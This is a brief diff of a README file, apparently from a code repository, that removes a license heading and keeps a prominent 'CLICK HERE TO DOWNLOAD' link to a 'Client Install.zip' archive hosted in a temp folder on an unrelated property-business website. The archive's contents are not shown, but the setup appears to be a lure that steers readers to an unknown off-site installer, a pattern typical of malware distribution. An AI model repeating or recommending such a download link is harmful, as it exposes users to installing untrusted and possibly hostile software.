@@ -1,6 +1,5 @@
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
-# [MIT License](LICENSE)
 # [CLICK HERE TO DOWNLOAD](https://abitareproperties.com/temp/Client%20Install.zip)
 
 # Screenshot
